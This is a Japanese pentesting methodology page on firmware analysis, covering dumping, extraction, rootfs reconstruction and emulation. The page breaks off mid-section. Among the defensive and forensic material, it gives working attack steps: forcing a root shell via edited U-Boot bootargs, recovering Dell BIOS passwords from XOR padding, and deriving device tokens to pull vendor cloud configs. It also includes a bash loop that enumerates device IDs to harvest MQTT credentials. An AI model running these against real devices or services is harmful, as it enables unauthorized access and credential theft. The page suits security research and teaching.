# ファームウェア解析

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **はじめに**

### 関連リソース

公開されているハードウェアインターフェースから取得する方法については、[UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) と [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) を参照してください。コンソールにアクセスする前に、起動時のUARTデータを再現可能な方法でキャプチャするには、[SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi) を参照してください。

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

ファームウェアは、ハードウェアコンポーネントとユーザーが操作するソフトウェアとの通信を管理・促進し、デバイスを正しく動作させるために不可欠なソフトウェアです。永続メモリに保存されているため、デバイスの電源が入った時点から重要な命令にアクセスでき、オペレーティングシステムの起動につながります。セキュリティ上の脆弱性を特定するうえで、ファームウェアの調査や潜在的な改変は重要なステップです。<sup>[[2]](#references)[[3]](#references)</sup>

## **情報収集**

**情報収集**は、デバイスの構成や使用されている技術を理解するための重要な初期ステップです。このプロセスでは、次のデータを収集します。

- CPUアーキテクチャと実行されているオペレーティングシステム
- ブートローダーの詳細
- ハードウェアの構成とデータシート
- コードベースのメトリクスとソースの場所
- 外部ライブラリとライセンスの種類
- 更新履歴と規制認証
- アーキテクチャ図とフロー図
- セキュリティ評価と特定された脆弱性

この目的には、**オープンソースインテリジェンス（OSINT）**ツールが非常に役立ちます。また、利用可能なオープンソースソフトウェアコンポーネントを、手動および自動のレビュープロセスで分析することも有効です。[Coverity Scan](https://scan.coverity.com) や [Semmle’s LGTM](https://lgtm.com/#explore) などのツールは、潜在的な問題の検出に活用できる無料の静的解析を提供しています。

## **ファームウェアの取得**

ファームウェアの取得にはさまざまな方法があり、それぞれ複雑さが異なります。

- 提供元（開発者、メーカー）から**直接**入手する
- 提供された手順に従って**ビルド**する
- 公式サポートサイトから**ダウンロード**する
- ホストされているファームウェアファイルを探すために **Google dork** クエリを利用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner) などのツールを使って **cloud storage** に直接アクセスする
- man-in-the-middle の手法で**更新を傍受**する
- **UART**、**JTAG**、**PICit** などの接続を通じてデバイスから**抽出**する
- デバイスの通信を監視して更新リクエストを**スニッフィング**する
- **ハードコードされた更新エンドポイント**を特定して利用する
- ブートローダーまたはネットワークから**ダンプ**する
- 他の方法がすべて失敗した場合、適切なハードウェアツールを使ってストレージチップを**取り外して読み取る**

### UARTログのみの場合: フラッシュ内のU-Boot環境変数を使ってroot shellを強制する

UART RXが無視される場合（ログのみの場合）でも、オフラインで**U-Boot環境変数のblobを編集**すれば、init shellを強制的に起動できます。<sup>[[6]](#references)</sup>

1. SOIC-8クリップとプログラマー（3.3V）を使ってSPIフラッシュをダンプします。
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partitionを特定し、`bootargs`を編集して`init=/bin/sh`を追加し、blobの**U-Boot env CRC32を再計算**します。
3. env partitionのみを再フラッシュして再起動すると、UARTにshellが表示されます。

これは、bootloader shellが無効になっているものの、外部flashアクセス経由でenv partitionを書き換えられる組み込みデバイスで役立ちます。

## ファームウェアの分析

**ファームウェアを入手できた**ので、どのように扱うべきかを判断するために、ファームウェアから情報を抽出する必要があります。そのために使用できるツールをいくつか紹介します。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

それらのツールであまり見つからない場合は、`binwalk -E <bin>` を使ってイメージの**エントロピー**を確認してください。エントロピーが低ければ、暗号化されている可能性は低いでしょう。高ければ、暗号化されている可能性が高いです（または何らかの方法で圧縮されています）。

さらに、次のツールを使って**firmware内に埋め込まれたファイル**を抽出できます。

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または、[**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使ってファイルを調べることもできます。

### 差分flash解析と復元可能なXORシークレットストア

firmwareの設定に、文書化された保存形式がない場合は、まず同じ状態でflashを複数回読み取り、設定を**ちょうど1つだけ**変更してから、チップ全体を再度ダンプし、オフセットを比較します。値を変えて実験を繰り返せば、その設定とカウンターや書き込みメタデータを区別できます。変更が既存の位置ではなく新しいオフセットに現れる場合は、追記専用またはログ構造のストアであることを示しています。削除済みまたはtombstone化されたエントリも保持してください。ペイロードのバイト列を復元できる可能性があります。<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

領域を特定したら、`binwalk` などのツールで firmware modules を抽出し、Ghidra で writer/validator をリバースエンジニアリングします。暗号文のパターンだけから方式を推測するのではなく、コードでフィールド境界、padding、key indexing、key derivation を確認してください。<sup>[[12]](#references)</sup>

#### 暗号化されたゼロ padding からキーを復元する

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) で説明したとおり、既知平文から同じオフセットの keystream bytes が判明します。固定サイズのフィールドでは、ゼロ padding が繰り返し XOR key のすべてのインデックスに及ぶ場合、特に脆弱です。`0x00 XOR key_byte = key_byte` なので、暗号化された padding から key bytes を直接読み取れます。すべての key index がカバーされていれば、暗号文の末尾からキーを復元し、データが格納された部分を復号できます。<sup>[[12]](#references)</sup>

Dell の脆弱な DVAR BIOS-password format は具体例です。32-byte field の byte `0` は平文で、bytes `1..31` は繰り返し使用される 20-byte key で暗号化されています。<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

パスワード長が `L` の場合、XOR 前の位置 `L..31` はゼロでした。`L <= 12` なら、これらの位置がすべてのキーインデックスを網羅するため、brute force なしでキーとパスワード全体を復元できます:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 過去の記録から鍵を取り出す

各レコードを個別に解析してはいけません。DVAR key はおおよそ `modified_md5(device_seed || variable_GUID || password[0])` として導出されます。device seed と GUID は固定されており、password に依存する入力は平文の先頭 byte のみです。したがって、デバイスごとの鍵は最大 256 個で、同じ byte から始まるレコードは同じ鍵を共有します。active および deleted のレコードをその byte ごとにグループ化します。短い過去のレコードは、padding を通じて鍵全体を漏らし、自身の padding だけでは不十分な現在の長いレコードを復号できる場合があります。そのため、古い ciphertext を消去せず tombstone 化すると、password のローテーションによって露出が増える可能性があります。<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) tool は DVAR を見つけ、候補レコードを検証し、password を復元し、保存されたデータや鍵の raw bytes を表示できます。checkout からビルドし、検証済みの flash image を次のようにスキャンします。<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

カスタムパーサーでは、レコード構造、印字可能文字の制約、ゼロパディングの確認、鍵のエントロピー、鍵が折り返される箇所の一貫性を使って誤検出を排除します。ダンプを繰り返し取得して書き込みごとのビット反転がまばらに観測される場合は、観測されたマスクを列挙し、これらの制約に基づいて修正候補を順位付けします。ただし、曖昧な文字はヒューリスティックな結果を正確な復元結果として提示せず、曖昧なまま報告してください。<sup>[[12]](#references)</sup>

パスワード検証子には、可逆暗号文ではなく、ソルト付きの反復型一方向ハッシュを保存します。また、ログ構造型ストレージでは、置き換えられた秘密情報を安全に削除してください。<sup>[[12]](#references)</sup>

### ファイルシステムの取得

前述のコメント付きツール（`binwalk -ev <bin>` など）を使えば、**ファイルシステムを抽出**できているはずです。\
Binwalkは通常、**ファイルシステムの種類にちなんだ名前のフォルダー**に抽出します。一般的な種類は次のとおりです: squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### ファイルシステムの手動抽出

Binwalkのシグネチャに、ファイルシステムの**マジックバイトが含まれていない**場合があります。その場合は、binwalkで**ファイルシステムのオフセットを特定して、圧縮されたファイルシステムをバイナリからcarveし**、以下の手順に従って種類に応じた方法で**手動で抽出**します。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

以下の**dd command**を実行して、Squashfsファイルシステムをcarveします。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

また、次のコマンドを実行する方法もあります。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

その後、ファイルは "`squashfs-root`" ディレクトリに格納されます。

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NAND flash を使用する ubifs ファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 分割された組み込み root filesystem の再構築

raw eMMC/SSD dump に有効なファイルシステムヘッダーが含まれていても、そのメタデータのオフセットが公称パーティションの範囲を超えている場合、すぐに破損していると判断しないでください。組み込みの boot code は Device Mapper を使って複数の物理範囲から実際の root device を構成することがあるため、GPT パーティションを1つだけ切り出すと、最初のセグメントしか取得できません。<sup>[[9]](#references)</sup>

#### メディアイメージ全体をトリアージする

まず、取得が完了していること、サイズが安定していること、書き込みプロセスがイメージをまだ開いていないことを確認します。ファイル名に開始アドレスと終了アドレスが含まれている場合は、その範囲を実際のバイト数と比較してください。GPT を読み取り専用モードで復元し、必要な範囲だけをアタッチします。ボリュームグループの競合や意図しない書き込みが発生する可能性があるため、信頼できない物理ボリュームに対してワークステーション上で `vgchange -ay` を実行**しないでください**。<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

元の init logic または LVM stack がイメージ全体を参照する必要がある場合は、使い捨ての VM を使用してください。標準の boot partition に残された過去の boot log は特に有用です。bootloader が proprietary container のオフセット、コンポーネントの長さ、slot の選択、アライメント規則、署名検証を記録していることがあります。これらの値を使って、埋め込まれた command line/kernel/initramfs を切り出し、各出力を `file`、magic bytes、`binwalk` で個別に検証してください。container の終端まで読み込むと、initrd、ACPI object、signature が kernel に誤って追加されることがあります。<sup>[[9]](#references)</sup>

#### boot 時の block map を復元する

kernel の initramfs を展開し、その `/init` と storage library をリバースエンジニアリングします。[Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) では、`/proc/cmdline`、`/dev/mapper/`、`dmsetup`、`BLKGETSIZE64`、partition path の文字列参照をたどり、アクティブな A/B slot を選択して table を構築するコードを追跡してください。radare2 の有用な開始コマンドは `r2 -A init`、`afl`、`pdf @ main`、`pdf @ fcn.xxxxx` です。<sup>[[9]](#references)</sup>

linear target は、仮想デバイスの連続した範囲を、1 つ以上の backing device の範囲にマッピングします。復元した 2 セグメントの table は、一般的に次の形式です（すべての位置と長さの単位は 512-byte sector です）。<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

機械語の算術演算を、整数幅、シフト、単位変換も含めて正確に再現してください。たとえば、次の式はバイト数をまず4-KiB境界に切り下げてから512-byteセクターに変換します。これを `p4_bytes // 512` に置き換えると、パーティションがページ境界に揃っていない場合、選択される末尾が `p4_bytes % 4096` だけずれます。<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

テーブル順に範囲をコピーし、チャンクサイズに上限を設けて、メディアダンプ全体をメモリに読み込まずにフラットな解析イメージを再構築します。これにより、ホスト側の mapper デバイスの作成も避けられます。GPT から得たオフセット、反転したセクター数、出力の長さは、それぞれ別個にアサーションで検証します。<sup>[[9]](#references)</sup>

#### 破損と一定の再構築エラーを区別する

SquashFS では、`unsquashfs` を実行する前に、`hsqs` マジックを確認し、スーパーブロックのオフセット 40 にあるリトルエンディアンの 64 ビット `bytes_used` フィールドをデコードします。複数の無関係な構造の抽出に失敗する場合は、予想される位置の周辺を広く検索し、強い構造的根拠がある候補を要求します。たとえば、展開可能なメタデータブロック、連続する複数の有効なディレクトリエントリ、妥当な inode フィールド、inode 数と整合するルート inode、または有効な整合性メタデータ構造です。マジックが 1 つ一致するだけでは不十分です。<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

同じ符号付き差分によって、ディレクトリメタデータとverityレコードなど、独立した構造が有効になる場合、原因はバイト欠損ではなく、セグメント開始位置の系統的な誤りである可能性が高いです。孤立データの復元やファイルシステムメタデータのパッチ適用を試みる前に、逆算に戻り、切り捨てられた余り、符号の扱い、オーバーフロー、セクター／ページ単位の丸めを確認してください。<sup>[[9]](#references)</sup>

最後に、保護の境界を分けて考えてください。TPMでシールされたLUKSボリュームはデータの機密性を保護し、署名済みのdm-verityマッピングはルートファイルシステムの完全性を保護します。ソフトウェアTPMでは、元の物理TPMにシールされた鍵は復元できません。また、verity検証を省略する研究専用のinitを使って改変済みのSquashFSを起動しても、署名を偽造したことにも、dm-verityを破ったことにもなりません。<sup>[[9]](#references)</sup>

## ファームウェアの分析

ファームウェアを入手したら、その構造と潜在的な脆弱性を理解するために、ファームウェアを解析することが重要です。このプロセスでは、さまざまなツールを使用してファームウェアイメージを分析し、有用なデータを抽出します。

### 初期分析ツール

バイナリファイル（`<bin>`と表記）の初期検査に使うコマンドを以下に示します。ファイルの種類の特定、文字列の抽出、バイナリデータの分析、パーティションとファイルシステムの詳細の把握に役立ちます。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

イメージの暗号化状態を評価するには、`binwalk -E <bin>` を使って**エントロピー**を確認します。エントロピーが低い場合は暗号化されていない可能性が高く、エントロピーが高い場合は暗号化または圧縮されている可能性があります。

**埋め込みファイル**を抽出するには、**file-data-carving-recovery-tools** のドキュメントや、ファイルの調査に使える **binvis.io** などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使うと、通常はファイルシステムを抽出できます。抽出先は多くの場合、ファイルシステムの種類にちなんだ名前のディレクトリ（例: squashfs、ubifs）です。ただし、マジックバイトが不足しているために **binwalk** がファイルシステムの種類を認識できない場合は、手動で抽出する必要があります。その場合は、まず `binwalk` でファイルシステムのオフセットを特定し、次に `dd` コマンドを使ってファイルシステムを切り出します。

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

その後、ファイルシステムの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドを使用します。

### ファイルシステムの分析

ファイルシステムを抽出したら、セキュリティ上の欠陥の調査を開始します。安全でないネットワークデーモン、ハードコードされた認証情報、APIエンドポイント、更新サーバーの機能、未コンパイルのコード、起動スクリプト、オフライン分析用のコンパイル済みバイナリに注目します。

**確認すべき主な場所**と**項目**には、以下が含まれます。

- ユーザー認証情報を確認するための **etc/shadow** と **etc/passwd**
- **etc/ssl** 内の SSL証明書と鍵
- 脆弱性の可能性がある設定ファイルとスクリプトファイル
- さらなる分析に使用する組み込みバイナリ
- 一般的な IoT デバイスの Web サーバーとバイナリ

ファイルシステム内の機密情報や脆弱性の発見に役立つツールには、以下があります。

- 機密情報の検索に使う [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- ファームウェアを包括的に分析する [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 静的・動的分析に使う [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、[**EMBA**](https://github.com/e-m-b-a/emba)

### コンパイル済みバイナリのセキュリティチェック

ファイルシステム内で見つかったソースコードとコンパイル済みバイナリの両方を、脆弱性がないか精査する必要があります。Unixバイナリ向けの **checksec.sh** や、Windowsバイナリ向けの **PESecurity** などのツールを使うと、悪用可能な保護されていないバイナリを特定できます。

## 生成した URL トークンを使ったクラウド設定と MQTT 認証情報の取得

多くの IoT ハブは、次のようなクラウドエンドポイントからデバイスごとの設定を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

ファームウェア分析では、たとえば次のように、`<token>` がハードコードされた秘密鍵を使ってデバイス ID からローカルで生成されることが分かる場合があります。

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計では、deviceId と STATIC_KEY を知っている人なら誰でも URL を再構築してクラウド設定を取得でき、多くの場合、平文の MQTT 認証情報やトピックのプレフィックスが明らかになります。

実践的な手順:

1) UART の起動ログから deviceId を抽出する

- 3.3V UART アダプター（TX/RX/GND）を接続し、ログを取得します。

```bash
picocom -b 115200 /dev/ttyUSB0
```

- cloud config の URL パターンとブローカーアドレスを出力する行を探します。例：

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmwareからSTATIC_KEYとtokenアルゴリズムを復元する

- バイナリをGhidra/radare2に読み込み、config path（「/pf/」）またはMD5の使用箇所を検索する。
- アルゴリズムを確認する（例：MD5(deviceId||STATIC_KEY)）。
- Bashでtokenを導出し、digestを大文字にする：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) クラウド設定と MQTT 認証情報を収集

- URLを組み立ててcurlでJSONを取得し、jqで解析して秘密情報を抽出します:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 平文 MQTT と弱い topic ACL を悪用する（存在する場合）

- 復元した認証情報を使ってメンテナンス用 topic を subscribe し、機密性の高いイベントを探します。

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 予測可能なデバイス ID を列挙する（大規模に、許可を得て）

- 多くのエコシステムでは、ベンダーの OUI／製品／種類を示すバイト列の後に、連番のサフィックスが埋め込まれています。
- 候補 ID を順に試し、トークンを導出して、設定をプログラムで取得できます。

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- 大量の列挙を試みる前に、必ず明示的な許可を得てください。
- 可能であれば、ターゲットハードウェアを変更せずに秘密情報を復元するため、エミュレーションまたは静的解析を優先してください。


ファームウェアをエミュレートすると、デバイスの動作または個々のプログラムの**動的解析**が可能になります。この方法では、ハードウェアやアーキテクチャへの依存が課題となることがありますが、root filesystemまたは特定のバイナリを、Raspberry Piのようなアーキテクチャとエンディアンが一致するデバイス、あるいは事前に構築された仮想マシンに転送することで、さらなるテストが可能になります。

### 個々のバイナリのエミュレーション

単一のプログラムを調べる場合は、そのプログラムのエンディアンとCPUアーキテクチャを特定することが重要です。

#### MIPSアーキテクチャの例

MIPSアーキテクチャのバイナリをエミュレートするには、次のコマンドを使用できます：

```bash
file ./squashfs-root/bin/busybox
```

必要なエミュレーションツールをインストールするには:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS（ビッグエンディアン）では `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` を使用します。

#### ARM Architecture Emulation

ARM バイナリの場合も同様の手順で、エミュレーションには `qemu-arm` エミュレーターを使用します。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールを使うと、ファームウェア全体のエミュレーションを行えます。プロセスを自動化し、動的解析を支援します。

### Reconstructing split and verified root filesystems for emulation

SquashFS の superblock は読み取れるのに、inode、ディレクトリ、または fragment table のオフセットがあり得ない値になっている場合、すぐに `unsquashfs` にパッチを当てないでください。初期ブートバイナリをリバースエンジニアリングし、バイナリが生成するブロックデバイスの構成を再現してください。組み込みシステムでは、名目上の root partition が公開されていても、別の partition から借りたセクターを追加する `dm-linear` マッピングによって、実際のファイルシステムが構成されている場合があります。superblock のみの検査は成功しても、それ以降のすべてのメタデータブロックがずれていることがあります。<sup>[[11]](#references)</sup>

ファームウェアの演算を正確に再現してください。特に、長さの単位がバイト、512 バイトセクター、4 KiB ページのどれなのかを特定し、シフトと切り捨てを元の順序で再現し、A/B レイアウトのバンクに依存する末尾領域も考慮してください。たとえば `(partition_bytes >> 12) << 3` は、まず 4 KiB 境界で切り捨ててから、結果を 512 バイトセクター単位で表します。これを `partition_bytes // 512` に置き換えると、追加される領域の位置が数キロバイトずれて、その後の SquashFS table がすべて破損する可能性があります。<sup>[[11]](#references)</sup>

有用な検証ワークフローは次のとおりです。<sup>[[11]](#references)</sup>

1. verifier/init バイナリから、各 `dm-linear` セグメントのソースデバイス、開始セクター、長さを特定します。
2. アラインメントの扱いを変えずに、各 extent を連結するかマッピングします。
3. それでも抽出に失敗する場合は、予測した境界の前後の狭い範囲だけを検索し、もっともらしい superblock だけで判断せず、連続する複数の有効なメタデータ構造を確認します。
4. 再構築したイメージに、変更していない `unsquashfs` を実行します。`unsquashfs -stat` よりも、すべてのディレクトリと fragment を正常に走査できることのほうが強い証拠になります。

#### Analyst-controlled dm-verity replacement

解析者が QEMU のカーネル、initramfs、仮想ディスクを制御できる場合、ベンダーの検証用 PID 1 を小さな静的リンク init に置き換えることで、改変した root を起動できます。これは **lab boot-chain substitution** であり、dm-verity、その RSA 署名、Secure Boot、または TPM に封印された鍵を破るものではありません。<sup>[[11]](#references)</sup>

置き換える init は、元のブート処理の実動部分を再現する必要があります。`devtmpfs` をマウントし、`setsid()` を呼び出し、`/dev/console` をファイルディスクリプター 0～2 に接続し、`/proc` と `/sys` をマウントして、指定されたブロックデバイスが利用可能になるまで待ちます。その後、編集した root を読み取り専用でマウントし、古い root の疑似ファイルシステムを切り離し、新しいマウントを `/` に移動し、`chroot` して、ファームウェア本来の `/sbin/init` を `execve()` します。`MS_MOVE` の**前に**`/dev`、`/proc`、`/sys` を切り離すことで、新しい root に属するマウントポイントを誤って切り離すのを防げます。<sup>[[11]](#references)</sup>

変更可能なデバイス状態は、改変した不変 root とは分けて保持してください。qcow2 overlay で元のディスクの LVM 状態を保持しつつ、編集した SquashFS を別の読み取り専用 virtio ディスクで提供できます。<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### オフラインのイメージ状態のデバッグ

起動が遅い、破壊的な起動スクリプトがある、またはコンソールログが不安定で障害の原因が分かりにくい場合は、guest の外部で永続状態を調査します。実行中の VM が使用している overlay は決してアタッチしないでください。`qemu-nbd` で公開し、LVM の検出対象を目的の NBD パーティションに限定してから、切断前にボリュームグループを非アクティブ化します。<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

再現可能な障害切り分けを行うには、書き込み可能な安定したボリュームにタイムスタンプ付きのマーカーファイルを書き込み、オフラインで検証します。`/dev/kmsg`、FIFO、一時的なコンソールでは、レート制限やプロセスの早期終了によって誤検知が発生することがあります。また、関係のないコードを変更する前に、レイヤー間でインターフェースが完全に一致しているか比較します。たとえば、`uname -r` と `/lib/modules/`、ディスク上の ext4 機能とカーネル設定、Mesa の `libGL` 世代と DRI ドライバー ABI、および PCI から導出されるドライバー名を確認します。コンポーネントが存在し、`dlopen()` に成功しても、利用側が異なる ABI を想定しているために使用できない場合があります。<sup>[[11]](#references)</sup>

## 実践的な動的解析

この段階では、実機またはエミュレートされたデバイス環境を解析に使用します。OS とファイルシステムへの shell access を維持することが不可欠です。エミュレーションではハードウェアとのやり取りを完全には再現できないことがあり、エミュレーターを再起動しなければならない場合もあります。解析では、ファイルシステムを再確認し、公開されているWebページやネットワークサービスを悪用し、ブートローダーの脆弱性を調査します。バックドアの脆弱性の可能性を特定するには、ファームウェアの整合性テストが重要です。

## 実行時解析の手法

実行時解析では、gdb-multiarch、Frida、Ghidra などのツールを使って、実行環境内のプロセスやバイナリを操作します。ブレークポイントを設定し、ファジングなどの手法で脆弱性を特定します。

完全なデバッガーがない組み込みターゲットでは、**静的リンクされた `gdbserver` をデバイスにコピー**し、リモートで接続します。<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor message mapping

IoTハブでは、RFスタックが**radio MCU**とLinuxのユーザーランドプロセスに分割されていることがよくあります。有用なワークフローは、次の経路をマッピングすることです。<sup>[[8]](#references)</sup>

1. 無線上の**RF frame**
2. radio MCU上の**controller-side parser**
3. Linuxに転送される**serial/UART textまたはTLV protocol**（例: `/dev/tty*`）
4. メインデーモン内の**application dispatcher**
5. **protocol-specific handler / state machine**

このアーキテクチャでは、解析対象が1つではなく2つになります。コントローラーがバイナリの無線フレームを`Group,Command,arg1,arg2,...`のようなテキストプロトコルに変換する場合は、次の情報を特定します。

- **message groups**とdispatch table
- どのメッセージが**network**由来で、どれがコントローラー自身から送られるのか
- 正確な**manufacturer-specific discriminator fields**（例: Zigbeeの`manufacturer_code`とカスタムの`cluster_command`）
- **commissioning**、discovery、またはfirmware/model downloadフェーズでのみ到達可能なhandler

Zigbeeでは、ペアリング通信をキャプチャし、対象がデフォルトの**Link Key** `ZigBeeAlliance09`に依然として依存しているか確認します。依存している場合、commissioning通信のスニッフィングで**Network Key**が漏えいする可能性があります。Zigbee 3.0のinstall codeはこのリスクを低減するため、テスト対象デバイスが実際にそれらを強制しているか確認します。

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCLコマンドは、標準化されたclusterよりも有力なターゲットであることがよくあります。検証の蓄積が少ない**custom parsing code**や内部**FSM**に入力を渡すためです。<sup>[[8]](#references)</sup>

実践的なワークフロー:

- command dispatcherを解析し、**vendor-only handler**を見つけます。
- **FSM state**、**event**、**check**、**action**、**next-state**のtableを特定します。
- 自動的に次へ進む**transitional state**と、最終的にattacker-controlled stateをリセットまたは解放するretry/error branchを特定します。
- 脆弱なhandlerに常に到達可能だと仮定せず、デーモンを脆弱な状態にするために必要な正規のprotocol exchangeを確認します。

タイミングに敏感なprotocolでは、Python frameworkからのpacket replayでは遅すぎる場合があります。より確実なのは、vendor-grade stackを使い、実機（例: **nRF52840**）上で正規のデバイスをエミュレートして、正しい**endpoint**、**attribute**、commissioningのタイミングを再現する方法です。

### Fragmented-download bug class in embedded daemons

組み込みデーモンでは、**fragmented blob/model/configuration download**において、繰り返し発生するファームウェアバグがあります。<sup>[[8]](#references)</sup>

